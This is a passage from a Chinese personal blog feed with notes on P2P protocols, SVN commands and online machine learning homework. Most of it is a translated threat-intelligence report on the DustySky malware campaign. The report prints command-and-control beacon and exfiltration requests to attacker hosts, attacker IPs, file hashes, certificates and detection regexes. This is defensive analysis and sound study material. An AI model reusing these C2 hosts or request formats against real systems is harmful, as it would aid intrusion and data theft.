class="function"><span class="keyword">char</span> *<span class="title">inet_ntoa</span> <span class="params">(struct in_addr __in)</span></span>;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Program</category>
        <category>C/C++</category>
      </categories>
      <tags>
        <tag>网络</tag>
      </tags>
  </entry>
  <entry>
    <title>p2p协议资料收集</title>
    <url>/2019/03/13/2019-03-13-p2pProtocolDataCollection/</url>
    <content><![CDATA[<h1 id="常见p2p协议"><a href="#常见p2p协议" class="headerlink" title="常见p2p协议"></a>常见p2p协议</h1><p>概括自: <a href="http://blog.chinaunix.net/uid-11572501-id-2868679.html" target="_blank" rel="noopener">常用P2P协议剖析</a></p><ul><li>napster</li><li>Gnutella</li><li>eMule</li><li>Bittorent</li><li>DHT网络</li></ul><h1 id="原理及实现"><a href="#原理及实现" class="headerlink" title="原理及实现"></a>原理及实现</h1><p><a href="https://zhuanlan.zhihu.com/p/26796476" target="_blank" rel="noopener">P2P通信原理与实现</a></p>]]></content>
      <categories>
        <category>Knowledge</category>
        <category>Study</category>
      </categories>
      <tags>
        <tag>网络</tag>
      </tags>
  </entry>
  <entry>
    <title>Operation DustySky文档翻译</title>
    <url>/2019/03/01/2019-03-01-OperationDustySkyTranslation/</url>
    <content><![CDATA[<h1 id="战术，技术和程序"><a href="#战术，技术和程序" class="headerlink" title="战术，技术和程序"></a>战术，技术和程序</h1><h2 id="交货"><a href="#交货" class="headerlink" title="交货"></a>交货</h2><p>发送邮件到多个目标，包含链接下载压缩文件或者附件直接带有压缩文件，这是一些例子</p><img src="/2019/03/01/2019-03-01-OperationDustySkyTranslation/Operation DustySky_01.bmp" width="80%"> <img src="/2019/03/01/2019-03-01-OperationDustySkyTranslation/Operation DustySky_02.bmp" width="80%"><p>链接可能包括以下参数：</p><ul><li>Id - 当前恶意电子邮件消息的ID，由明文字，加号和数字组成。 例如：Rand + 281</li><li>token1 - 与id相同，但Base64编码</li><li>token2 - 恶意消息发送到的目标的Base64编码电子邮件地址。</li><li>C - 单词Click或openexe</li></ul><p>匹配链接的正则表达式:</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">\/[A-Za-z]+\.php\?((?:id|token1|token2|C)=[A-Za-z0<span class="number">-9</span>\/=+%]*=&#123;<span class="number">0</span>,<span class="number">2</span>&#125;&amp;?)&#123;<span class="number">4</span>&#125;</span><br></pre></td></tr></table></figure><p>例子:<br>spynews.otzo[.]com/20151104/Update.php?id=&gt;redacted&gt;&amp;token1=&gt;redacted&gt;&amp;token2=&gt;redacted&gt;&amp;C=Click</p><p>压缩包包含一个.exe文件，有时伪装成Microsoft Word文件，视频或其他文件格式，使用相应的图标。 例如：</p><img src="/2019/03/01/2019-03-01-OperationDustySkyTranslation/Operation DustySky_03.bmp" width="80%"><h2 id="诱惑内容和发件人身份"><a href="#诱惑内容和发件人身份" class="headerlink" title="诱惑内容和发件人身份"></a>诱惑内容和发件人身份</h2><p>如果受害者提取存档并单击.exe文件，则在计算机感染DustySky时会显示诱饵文档或视频。</p><p>在最近的样本中，该组使用嵌入了恶意宏的Microsoft Word文件，如果启用，它将感染受害者。请注意，这些感染方法依赖于社交工程 - 说服受害者打开文件（并在禁用时启用内容） - 而不是软件漏洞。</p><p>恶意电子邮件的主题行以及诱饵文档的名称和内容通常与最近的外交，辩护和政治事件有关。有时诱惑主题是八卦或性别相关，甚至可能包括色情视频。在最近的样本中，使用了假发票和公共Google隐私政策的副本。</p><p>诱饵文档的内容始终从公共新闻项目或其他Web内容中复制，并且永远不是攻击者的原始组成。</p><p>恶意邮件中的“来自”字段通常设置为与诱饵文档相关，例如“最新以色列新闻”，“以色列热门故事”，“以色列国防军”，“（”مركزالإماراتللسياسات模仿<strong>阿联酋政策中心组织</strong>）。</p><ul><li>“该中心承担着预测区域，区域和国际政策趋势的未来以及不同地缘政治项目对该地区的影响的任务。 它旨在提供战略分析，政策文件，研究和研究，以服务于该地区任何机构或国家的决策者，优先考虑阿联酋。“</li></ul><p>当从恶意消息链接时，恶意软件将托管在云服务上（在copy.com中多次，合法文件托管服务），或者在攻击者控制的服务器上托管。</p><h2 id="网络钓鱼"><a href="#网络钓鱼" class="headerlink" title="网络钓鱼"></a>网络钓鱼</h2><p>当恶意软件托管在受攻击者控制的服务器上时，目标浏览器的用户代理字符串在单击恶意链接时会被检查。 如果目标使用Windows，则提供DuskySky。 如果操作系统与Windows不同，则目标服务于Google，Microsoft或Yahoo网络钓鱼页面</p><p>网络钓鱼页面的源代码由单个JavaScript块组成，在运行时将单个变量解码为HTML：</p><img src="/2019/03/01/2019-03-01-OperationDustySkyTranslation/Operation DustySky_04.png" width="80%"><p>在受害者填写并发送虚假登录表单后，他们将被重定向到合法网站。 例如，在一个案例中，受害者被重定向到以色列新闻网站NRG中的新闻项目。 只有新闻项目是旧的（从攻击前一年开始）并且与恶意电子邮件的原始主题无关。 它可能用于以前的攻击，攻击者不够关心或忘记将其更改为相关攻击。</p><h2 id="攻击软件开发人员"><a href="#攻击软件开发人员" class="headerlink" title="攻击软件开发人员"></a>攻击软件开发人员</h2><p>IP地址45.32.13.169以及指向它的所有域都拥有一个网页，该网页是合法且无关的软件网站的副本 - iMazing，一种iOS管理软件。</p><img src="/2019/03/01/2019-03-01-OperationDustySkyTranslation/Operation DustySky_08.png" width="80%"><p>这些域名中有一个类似的东西 - imazing[.] ga。<br>假网站的源代码显示它是在2015年10月22日从合法来源复制的：</p><img src="/2019/03/01/2019-03-01-OperationDustySkyTranslation/Operation DustySky_05.png" width="80%"><p>虚假网站与合法网站类似，为访问者提供下载iMazing软件的功能。 但是，虚假网站上的版本与DustySky恶意软件捆绑在一起。 在执行恶意版本（2f452e90c2f9b914543847ba2b431b9a）时，安装了合法的iMazing，而在后台DustySky被删除为名为Plugin.exe（1d9612a869ad929bd4dd16131ddb133a）的文件，并执行：</p><img src="/2019/03/01/2019-03-01-OperationDustySkyTranslation/Operation DustySky_06.png" width="80%"><p>有趣的是，我们发现自由职业者市场网站freelancer.com上发布的职位发布中提到的虚假域名’imazing [.] ga’。 在帖子中，攻击者声称他们正在寻找某人建立“像这个网站[sic]这样的应用程序”，并诱使观众“从’imazing [.] ga’下载应用程序并忽视[sic]” “如果有任何想法缺失或……，请告诉我。”</p><img src="/2019/03/01/2019-03-01-OperationDustySkyTranslation/Operation DustySky_09.png" width="80%"><p>这种行为偏离了攻击者通常向选定（虽然很多）个人发送恶意电子邮件的模式。 我们不清楚为什么他们会追随随机感染，但我们可以想象各种原因，例如访问可用作攻击代理的计算机，或获取受害者拥有的软件的许可证。</p><h2 id="感染后"><a href="#感染后" class="headerlink" title="感染后"></a>感染后</h2><p>本节介绍攻击者对我们调查过的受感染计算机执行的操作。 在感染计算机后，攻击者使用了DustySky的功能，以及他们随后下载到计算机的公共黑客工具。</p><p>他们在计算机中截取了屏幕截图和活动进程列表，并将它们发送到命令和控制服务器。 他们使用了BrowserPasswordDump，这是一个免费使用的公共工具，用于恢复保存在浏览器中的密码。 以下是我们在攻击者删除它后恢复的日志文件（在本例中为空）：</p><img src="/2019/03/01/2019-03-01-OperationDustySkyTranslation/Operation DustySky_10.png" width="80%"><p>恶意软件还会扫描计算机以查找包含特定关键字的文件。 base64格式的关键字列表从命令和控件中检索为文本文件。 例如：</p><img src="/2019/03/01/2019-03-01-OperationDustySkyTranslation/Operation DustySky_11.png" width="40%"> <img src="/2019/03/01/2019-03-01-OperationDustySkyTranslation/Operation DustySky_12.png" width="80%"><p>这些话告诉我们攻击者所追求的是什么：个人文件; 凭证，证书和私钥; 有关国土安全的信息。</p><h2 id="滥用破坏的电子邮件帐户"><a href="#滥用破坏的电子邮件帐户" class="headerlink" title="滥用破坏的电子邮件帐户"></a>滥用破坏的电子邮件帐户</h2><p>在一个案例中，攻击者使用窃取的电子邮件凭据并从96.44.156.201登录，可能是他们的代理或VPN端点。 他们还从5.101.140.118登录，这是一个属于名为privatetunnel.com的代理服务的IP地址（在之前的事件中，电子邮件是从附近的地址发送的 - 5.101.140.114）。</p><h1 id="恶意软件分析"><a href="#恶意软件分析" class="headerlink" title="恶意软件分析"></a>恶意软件分析</h1><p>DustySky（由其开发人员称为NeD）是一个用.NET编写的多阶段恶意软件。 本章将介绍其功能和主要功能。 分析的样本是589827c4cf94662544066b80bfda6ab从2015年8月下旬开始。它由DustySky dropper，DustySky核心和DustySky键盘记录组件组成。</p><h2 id="DustySky-dropper"><a href="#DustySky-dropper" class="headerlink" title="DustySky dropper"></a>DustySky dropper</h2><p>DustySky dropper试图逃避在虚拟机中运行。 一旦确定计算机不是VM，它就会提取，运行并向DustySky Core添加持久性。 它提取有关操作系统的基本信息，并检查是否存在防病毒。 它还提取并打开诱饵文档。</p><p>dropper的资源是在运行时删除的两个组件。 一个是诱饵文件（内部称为“新闻”），一旦执行dropper就会呈现给受害者。 另一个是DustySky Core，一个特洛伊木马后门，（内部称为“日志”）。</p><p>dropper使用以下函数来混淆函数名称和恶意软件的其他部分（在以后的版本中，使用了SmartAssembly 6.9.0.114 .NET混淆器）：</p><img src="/2019/03/01/2019-03-01-OperationDustySkyTranslation/Operation DustySky_13.png" width="80%"><p>对于VM规避，dropper会检查是否存在指示恶意软件在虚拟机中运行的DLL（vboxmrxnp.dll和vmbusres.dll表示虚拟机和vmGuestlib.dll，表示vmware）。</p><p>如果dropper确实在虚拟机中运行，它将打开诱饵文档并停止其活动：</p><img src="/2019/03/01/2019-03-01-OperationDustySkyTranslation/Operation DustySky_14.png" width="80%"><p>Dropper使用Windows Management Instrumentation来提取有关操作系统以及防病毒是否处于活动状态的信息。</p><p>DustySky Core被删除到％TEMP％并使用cmd或.NET界面运行。</p><img src="/2019/03/01/2019-03-01-OperationDustySkyTranslation/Operation DustySky_15.png" width="60%"><p>在计算机重新启动后为持久性创建一个注册表项：</p><img src="/2019/03/01/2019-03-01-OperationDustySkyTranslation/Operation DustySky_16.png" width="80%"><h2 id="DustySky核心"><a href="#DustySky核心" class="headerlink" title="DustySky核心"></a>DustySky核心</h2><p>DustySky Core是一个特洛伊木马后门程序，也是恶意软件的主要组成部分。 它与命令和控制服务器通信，对收集的数据，信息和文件进行泄露，并接收和执行命令。 它具有以下功能：</p><ul><li>收集有关操作系统版本，运行进程和已安装软件的信息。</li><li>搜索可移动媒体和网络驱动器，并将其自身复制到其中。</li><li>提取其他组件（例如键盘记录组件）或从命令和控制服务器接收它们，然后运行或删除它们。</li><li>逃避虚拟机。</li><li>关闭计算机或重新启动计算机。</li><li>确保只有一个恶意软件实例正在运行。</li></ul><p>键盘记录日志文件每50秒上传到服务器。 这些文件通过POST请求上传到以key.php结尾的URL。</p><img src="/2019/03/01/2019-03-01-OperationDustySkyTranslation/Operation DustySky_17.png" width="80%"><h2 id="DustySky键盘记录组件"><a href="#DustySky键盘记录组件" class="headerlink" title="DustySky键盘记录组件"></a>DustySky键盘记录组件</h2><p>DustySky核心中包含的组件之一是键盘记录器（例如15be036680c41f97dfac9201a7c51cfc）。 当命令和控制服务器命令时，提取并执行键盘记录器。 键盘记录日志保存到％TEMP％\ temps。</p><h2 id="pdb分析"><a href="#pdb分析" class="headerlink" title="pdb分析"></a>pdb分析</h2><p>DustySky示例中的pdb字符串结构如下：</p><p>b：\ World-2015 \ IL \ Working Tools \ 2015-12-27 NeD Ver 9 Rand - 192.169.6.199 \ NeD Worm \ obj \ x86 \ Release \ MusicLogs.pdb</p><p>来自23个样本的pdb字符串显示在“附录B - 指标”中。 在下表中，我们提供了包含pdb字符串的文件夹和文件名的细分，以反映DustySky自2015年5月首次发布以来的持续开发周期。</p><img src="/2019/03/01/2019-03-01-OperationDustySkyTranslation/Operation DustySky_18.png" width="80%"><h1 id="指挥与控制沟通"><a href="#指挥与控制沟通" class="headerlink" title="指挥与控制沟通"></a>指挥与控制沟通</h1><h2 id="交通示例"><a href="#交通示例" class="headerlink" title="交通示例"></a>交通示例</h2><p>以下是与命令和控制服务器通信的示例（标识符已被更改）。</p><p>DustySky有两个硬编码的命令和控制服务器域。 它首先通过向TEST.php或index.php发送GET请求来检查第一个是否处于活动状态，期望“OK”作为响应。 如果没有收到确定，它将尝试第二个域。</p><img src="/2019/03/01/2019-03-01-OperationDustySkyTranslation/Operation DustySky_19.png" width="80%"><p>例如，这是对index.php的初始GET请求：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">GET /index.php HTTP/1.1</span><br><span class="line">Host: facetoo.co[.]vu</span><br><span class="line">Connection: Keep-Alive</span><br></pre></td></tr></table></figure><p>服务器回复:</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Date: Sun, 06 Sep 2015 19:52:49 GMT</span><br><span class="line">Server: Apache/2.2.15 (CentOS)</span><br><span class="line">X-Powered-By: PHP/5.3.3</span><br><span class="line">Content-Length: 2</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line"></span><br><span class="line">OK</span><br></pre></td></tr></table></figure><p>接下来，发送GET请求，其中包含有关受感染计算机的信息，如Base64参数：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">GET</span><br><span class="line">/IOS.php?Pn=9TbmRvd3KTxpbmRvd3icj4&amp;fr=&amp;GR=RmFjZUJvb2soSU9TKTxicj4gMjAxNS</span><br><span class="line">0wOC0yNA&amp;com=IDxicj4gIDxicj4g&amp;ID=386578203222222738119472812481673914678</span><br><span class="line">&amp;o=TWljcm9zb2Z0IFdpbmRvd3MgNyBQcm9mZXNzaW9uYWwg&amp;ho=ZmFjZXRvby5jby52dQ==&amp;</span><br><span class="line">av=&amp;v=501P HTTP/1.1</span><br><span class="line">User-Agent: 386578203222222738119472812481673914678</span><br><span class="line">Host: facetoo.co[.]vu</span><br></pre></td></tr></table></figure><p>GET请求中URL的另一个示例：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://ra.goaglesmtp.co.vu/NSR.php?Pn=MWw1bEoxVDJqQiB8IFBTUFVCV1M&amp;fr=&amp;GR=REFGQksoTlNSKTxicj4gMjAxNS0xMS0wNA&amp;com=IDxicj4gIDxicj4g&amp;ID=13327920924134561851231757518321517760252DAFBK&amp;o=TWljcm9zb2Z0IFdpbmRvd3MgNyBIb21lIFByZW1pdW0g&amp;ho=cmEuZ29hZ2xlc210cC5jby52dQ==&amp;av=&amp;v=704</span><br></pre></td></tr></table></figure><img src="/2019/03/01/2019-03-01-OperationDustySkyTranslation/Operation DustySky_20.png" width="80%"><p>以下正则表达式与通信模式匹配：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">\/[A-Za-z]&#123;<span class="number">2</span>,<span class="number">5</span>&#125;\.php\?(?:(Pn|fr|GR|com|ID|o|ho|av|v)=[A-Za-z0<span class="number">-9</span>\/=+]*=&#123;<span class="number">0</span>,<span class="number">2</span>&#125;&amp;?)&#123;<span class="number">5</span>,<span class="number">9</span>&#125;</span><br></pre></td></tr></table></figure><p>作为POST请求发送到命令和控制的被盗信息：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">POST /RaR.php HTTP/1.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: 1042541562231131292551331782259622162135190107BK</span><br><span class="line">Host: down.supportcom.xyz</span><br><span class="line">Content-Length: 109127</span><br><span class="line">Expect: 100-continue</span><br><span class="line"></span><br><span class="line">ke=iVBORw0KGgoAAAANSUhEUgAAAyAAAAJYCAYAAACadoJwAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEh....</span><br><span class="line">ID=1042541562231131292551331782259622162135190107BK&amp;</span><br><span class="line">N=Screen-2015-10-06_05-15-34-PM.png</span><br><span class="line">HTTP/1.1 100 Continue</span><br></pre></td></tr></table></figure><h2 id="SSL和数字证书"><a href="#SSL和数字证书" class="headerlink" title="SSL和数字证书"></a>SSL和数字证书</h2><p>最近，命令和控制通信从HTTP变为HTTPS。 HTTPS流量中使用的数字证书可以是自签名的，也可以使用合法的Comodo颁发的证书。</p><p>域名’bulk-smtp [.] xyz’由攻击者拥有，使用以下数字证书：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Certificate:</span><br><span class="line">    Data:</span><br><span class="line">        Version: 3 (0x2)</span><br><span class="line">        Serial Number:</span><br><span class="line">            35:e5:39:4c:58:e8:4d:f5:fa:9a:3c:25:21:12:01:19</span><br><span class="line">    Signature Algorithm: sha256WithRSAEncryption</span><br><span class="line">        Issuer: C=GB, ST=Greater Manchester, L=Salford, O=COMODO CA Limited,CN=COMODO RSA Domain Validation Secure Server CA</span><br><span class="line">        Validity</span><br><span class="line">            Not Before: Nov 25 00:00:00 2015 GMT</span><br><span class="line">            Not After : Nov 24 23:59:59 2016 GMT</span><br><span class="line">        Subject: OU=Domain Control Validated, OU=PositiveSSL, CN=bulk-smtp.xyz</span><br></pre></td></tr></table></figure><img src="/2019/03/01/2019-03-01-OperationDustySkyTranslation/Operation DustySky_21.png" width="60%"> <img src="/2019/03/01/2019-03-01-OperationDustySkyTranslation/Operation DustySky_22.png" width="60%"><p>在使用Comodo颁发的证书之前，攻击者使用了自签名证书，冒充一家名为EMS的以色列TelAviv公司。 证书中的组织统一性是“电子邮件营销销售”</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Certificate:</span><br><span class="line">    Data:</span><br><span class="line">        Version: 3 (0x2)</span><br><span class="line">        Serial Number: 13229300438499639338 (0xb797eaa82fb0c02a)</span><br><span class="line">    Signature Algorithm: sha256WithRSAEncryption</span><br><span class="line">        Issuer: C=IL, ST=Israel - Telaviv, L=Tel Aviv, O=EMS, OU=Email Markting Sales, CN=email-market.ml/emailAddress=info@email-market.ml</span><br><span class="line">        Validity</span><br><span class="line">            Not Before: Nov 17 14:15:08 2015 GMT</span><br><span class="line">            Not After : Nov 16 14:15:08 2016 GMT</span><br><span class="line">        Subject: C=IL, ST=Israel - Telaviv, L=Tel Aviv, O=EMS, OU=Email Markting Sales, CN=email-market.ml/emailAddress=info@email-market.ml</span><br></pre></td></tr></table></figure><p>对于另一个域smtp.gq，使用了这个自签名证书：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Certificate:</span><br><span class="line">    Data:</span><br><span class="line">        Version: 1 (0x0)</span><br><span class="line">        Serial Number: 12074485766838107425 (0xa79130d4e1e53d21)</span><br><span class="line">    Signature Algorithm: sha1WithRSAEncryption</span><br><span class="line">        Issuer: C=IL, ST=Tel Aviv, L=Tel Aviv, O=BEM, OU=BEM co., CN=smtp.gq/emailAddress=info@smtp.gq</span><br><span class="line">        Validity</span><br><span class="line">            Not Before: Nov 17 14:48:51 2015 GMT</span><br><span class="line">            Not After : Dec 17 14:48:51 2015 GMT</span><br><span class="line">        Subject: C=IL, ST=Tel Aviv, L=Tel Aviv, O=BEM, OU=BEM co.,CN=smtp.gq /emailAddress=info@smtp.gq</span><br></pre></td></tr></table></figure><p>与其命令和控制服务器通信时，DustySky通信使用以下部分或全部路径：</p><ul><li>Update.php</li><li>conn.php</li><li>geoiploc.php</li><li>news.htm</li><li>pass.php</li><li>passho.php</li><li>passyah.php</li></ul><h2 id="基础设施"><a href="#基础设施" class="headerlink" title="基础设施"></a>基础设施</h2><p>使用PassiveTotal的攻击分析平台，我们能够可视化演员使用的关键基础设施的最近6个月的数据。 值得注意的是，在过去几周内所有IP地址都处于活动状态，其中许多域解析为动态DNS提供商（蓝色方块）和注册域（棕色方块）的组合（绿色方块）。 这些热图使我们能够识别可能由于演员调整战术而导致的有趣时期或基础设施变化。</p><img src="/2019/03/01/2019-03-01-OperationDustySkyTranslation/Operation DustySky_23.png" width="80%"><p>在此图中，我们可以看到演员在12月23日之前使用了动态DNS和注册域的组合。 在那一天，演员似乎删除了注册域并严格使用动态DNS。 目前还不清楚为什么会发生这种情况，但服务器可能会改变攻击中的功能或者不再需要它。</p><img src="/2019/03/01/2019-03-01-OperationDustySkyTranslation/Operation DustySky_24.png" width="80%"><p>在此图中，颜色可清楚地分析发生的活动。 感兴趣的主要时期似乎是动态DNS和注册域都在使用时。 这种情况发生在9月23日到12月17日，并且有很多天新域名与IP地址相关联。 虽然并不完全清楚，但这一时期可能反映了演员在其行动中的存在。 根据发送的电子邮件和编译日期，在此期间有大量的网络钓鱼活动正在进行中。 值得注意的是，此IP地址不再显示任何可能意味着已脱机的内容。</p><img src="/2019/03/01/2019-03-01-OperationDustySkyTranslation/Operation DustySky_25.png" width="80%"><p>在此图中，我们看到从9月9日开始的活动被定向到动态DNS提供商。 与Graph One类似，我们可以看到11月份时间段内域名增加，12月份下降。 同样，并不完全清楚，但11月可能是攻击者认为有必要使他们在攻击中使用的域名多样化的点。</p><img src="/2019/03/01/2019-03-01-OperationDustySkyTranslation/Operation DustySky_26.png" width="80%"><p>在此图中，灰色块表示大多数时间没有捕获任何活动。 从11月9日开始，演员们在添加动态DNS提供商之前引入了四个独特的注册域名。 这个IP地址最有趣的是动态DNS网址和注册域的内容导致托管Windows可执行文件的同一下载页面。 目前还不清楚为什么攻击者继续使用这两者，但是从注册域名转移到使用动态DNS域名也可能表明参与者开始明智了。 动态DNS基础结构的使用使得归因和跟踪更加困难，因为动态DNS域可以由无关联方共享。</p><img src="/2019/03/01/2019-03-01-OperationDustySkyTranslation/Operation DustySky_27.png" width="80%"><p>在此图中，我们看到直到最近几个月同样缺乏数据以及动态DNS和注册域的使用。 鉴于最近的活动以及指向此IP地址的大量域名，这个服务器可能是最新的参与者，这似乎是合理的。 事实上，它可能涉及我们在今年看到的持续运营。</p>]]></content>
      <categories>
        <category>Knowledge</category>
        <category>Book</category>
      </categories>
  </entry>
  <entry>
    <title>svn学习笔记</title>
    <url>/2019/02/18/2019-02-18-svnStudy/</url>
    <content><![CDATA[<h1 id="命令解析"><a href="#命令解析" class="headerlink" title="命令解析"></a>命令解析</h1><h2 id="更新文件"><a href="#更新文件" class="headerlink" title="更新文件"></a>更新文件</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">svn update #当前目录所有文件更新到最新</span><br></pre></td></tr></table></figure><h2 id="添加文件"><a href="#添加文件" class="headerlink" title="添加文件"></a>添加文件</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">svn add test.php                        #添加test.php </span><br><span class="line">svn commit -m “添加我的测试用test.php“    #提交</span><br><span class="line">svn add *.php                           #添加当前目录下所有的php文件</span><br><span class="line">svn commit -m “添加我的测试用全部php文件“   #提交</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Program</category>
        <category>Shell</category>
      </categories>
      <tags>
        <tag>版本控制</tag>
      </tags>
  </entry>
  <entry>
    <title>在线机器学习作业解答</title>
    <url>/2019/01/11/2019-01-11-onelineMachineLearningHWAnswer/</url>
    <content><![CDATA[<h1 id="Homework-1"><a href="#Homework-1" class="headerlink" title="Homework 1"></a>Homework 1</h1><h2 id="1-Answer："><a href="#1-Answer：" class="headerlink" title="1. Answer："></a>1. Answer：</h2><h2 id="2-Answer："><a href="#2-Answer：" class="headerlink" title="2. Answer："></a>2. Answer：</h2><p>$ \because f\ is\ a\ convex\ function $<br>$ \therefore f(\alpha x + (1 - \alpha)x’) \leq \alpha f(x) + (1 - \alpha) f(x’) $<br>$ \because g\ is\ a\ monotonically\ non-decreasing\ function,$<br>$ \therefore $<br>$$ g[f(\alpha x + (1 - \alpha)x’)] \leq g[\alpha f(x) + (1 - \alpha) f(x’)] \tag{1} $$<br>$ \because g\ is\ a\ convex\ function $<br>$ \therefore $<br>$$ g[\alpha f(x) + (1 - \alpha)f(x’)] \leq \alpha g[f(x)] + (1 - \alpha) g[f(x’)] \tag{2} $$<br>$ (1) &amp; (2) \Rightarrow $<br>$$ \begin{array}{rl}<br>g[f(\alpha x + (1 - \alpha)x’)] &amp; \leq \alpha g[f(x)] + (1 - \alpha) g[f(x’)] \\<br>g \circ f(\alpha x + (1 - \alpha)x’) &amp; \leq \alpha g \circ f(x) + (1 - \alpha) g \circ f(x’) \\<br>\end{array} $$<br>$ \therefore g \circ f\ is\ convex $</p><h2 id="3-Answer"><a href="#3-Answer" class="headerlink" title="3. Answer:"></a>3. Answer:</h2><h3 id="a"><a href="#a" class="headerlink" title="a."></a>a.</h3><p>$ t = 1, \phi_1 = \phi_0 $<br>$ t = 2, \phi_2 = \sum_{i = 1}^{n} \frac{\phi_1 w_{2, i} c_{2, i}}{c_{1, i}} = \phi_1 \sum_{i = 1}^{n} \frac{w_{2, i} c_{2, i}}{c_{1, i}} $<br>…<br>$ t = t, \phi_t = \phi_0 \prod_{j = 1}^{t - 1}\sum_{i = 1}^{n} \frac{w_{j + 1, i} c_{j + 1, i}}{c_{j, i}} $</p><h3 id="b"><a href="#b" class="headerlink" title="b."></a>b.</h3><p>$ t = t, \phi_t = \phi_0 \prod_{j = 1}^{t - 1}\sum_{i = 1}^{n} \frac{w_i c_{j + 1, i}}{c_{j, i}} $</p>]]></content>
      <categories>
        <category>Knowledge</category>
        <category>Course</category>
      </categories>
  </entry>
  <entry>
    <title>在线机器学习作业</title>
    <url>/2019/01/05/2019-01-05-onlineMachineLearningHomework/</url>
    <content><![CDATA[<h1 id="Homework-1"><a href="#Homework-1" class="headerlink" title="Homework 1"></a>Homework 1</h1><p>在在线优化设置中，玩家玩点$w_t \in W $，对手以非负函数$f_t$响应，并且玩家遭受$f_t(w_t)$的损失。 假设$W$是一个有界集合，并且每个$f_t$在$W$上有较低的界限。玩家在$T$轮之后的遗憾被定义为：<br>$$ \sum_{t = 1}^{T} f_t(w_t) - \min\limits_{w \in W} \sum_{t = 1}^{T} f_t(w) $$<br>遗憾的界限是函数$R(T)$，使得对于任何序列$f_1, …, f_T$它保持：<br>$$ \forall T \sum_{t = 1}^{T} f_t(w_t) - \min\limits_{w \in W} \sum_{t = 1}^{T} f_t(w) \leq R(T) $$</p><ol><li><p>首先，证明我们可以在不失一般性的情况下假设每个$t$的$\min f_t(x) = 0$。<br>如果：<br>$$ f_t(w_t) = 0 \Rightarrow w_{t + 1} = w_t $$<br>在线优化算法是保守的。换句话说，保守算法只要不遭受任何损失就会保持同一点。设$A$为具有$R(T)$的后悔界限的在线优化算法。使用$A$定义具有相同后悔限制的保守在线优化算法$A’$.</p></li><li><p>回想一下，如果对于$f$域中的任何$\alpha \in [0, 1]$和任何$x$和$x’$，$f(\alpha x + (1 - \alpha)x’) \leq \alpha f(x) + (1 - \alpha) f(x’)$则函数$f$是凸的。 令$f: R \mapsto R$为凸函数，并且令$g: R \mapsto R$为凸单调非递减函数。 证明组合物$g \circ f$是凸的$(g \circ f(x) \equiv g(f(x)))$</p></li><li><p>考虑在没有交易成本的市场中管理在线股票投资组合的问题。 假设市场有$n$个不同的股票，我们可以在每个交易日结束时改变我们的投资组合，并且在第$t$天结束时的$n$个股票的价格由向量$c_t$表示。 我们最初的财富是$\phi_0$，而我们在$t$之后的财富是$\phi_t$。 在每一轮中，我们播放分布向量$w_t \in W$（$W$是总和为1的非负向量的集合）。 也就是说，在第$t$轮，我们在股票$i$上投资$\phi_{t - 1}w_{t, i}$美元。</p><ul><li>根据$w_1, …, w_t$和$c_0, c_1, …, c_t$写$\phi_t$</li><li>由固定概率向量$w$定义的不断重新平衡的投资组合（CRP）是一种每天重新平衡的投资策略，因此我们每天都将我们的财富$w_i$投资于股票$i$。 设$\phi_t^w$表示在第$t$天由$w$定义的CRP的财富。 根据$w$和$c_0, c_1, …, c_t$写$\phi_t^w$</li><li>在$T$轮之后将事后的最佳CRP定义为$\phi_T^* = max_w \phi_T^w$。 在$T$轮之后定义遗憾作为$log(\phi_T^* / \phi_T)$。表明最小化这种遗憾的定义是在课堂上讨论的在线凸优化框架的一个特例（提示：使用问题2来表明–$log(u \cdot v)$是凸的并且将投资组合管理问题写成在线凸优化问题）</li></ul></li></ol><h1 id="Homework-2"><a href="#Homework-2" class="headerlink" title="Homework 2"></a>Homework 2</h1><ol><li><strong>加倍的把戏</strong> 你得到一个在线算法$A$保证$Regret \leq T^p$，对于某些$p \in (0, 1)$，但它有参数必须作为$T$的函数选择。使用这个算法作为黑盒子，我们将构造一个遗憾的算法 对所有$T$同时保留的绑定$O(T^p)$.特别是，我们将分析以下转换：<br>$\textbf{for}\ epoch\ m = 0, 1, 2, …\ \textbf{do}$<br>$\qquad Reset\ A\ with\ parameters\ chosen\ for\ T = 2^m$<br>$\qquad \textbf{for}\ rounds\ t = 2^m, …, 2^{m + 1} - 1\ \textbf{do}$<br>$\qquad \qquad Run\ A$<br>本质上，该算法最初猜测$T = 1$，当它观察到这个猜测太低时，它将它的初始猜测加倍并重新启动$A$.因此，这被称为“双重技巧”<br>要显示所需的遗憾，请考虑任何T，和<ul><li>表明对边界$1$到$T$的遗憾小于或等于时期$m = 0$到时期$m_T = [log_2(T)]$结束时的遗憾。 然后，使用$A$的遗憾绑定这些时代的累积遗憾</li><li>简化(a)的界限，表明它的上限是常数$T^p$的上限。提示：使用$x \neq 1$的事实:<br>$$ \sum\limits_{k = 0}^n x^k = \frac{x^{n + 1} - 1}{x - 1} $$</li></ul></li></ol>]]></content>
      <categories>
        <category>Knowledge</category>
        <category>Course</category>
      </categories>
  </entry>
  <entry>
    <title>在线机器学习课程笔记</title>
    <url>/2019/01/02/2019-01-02-onlineMachineLearningNotes/</url>
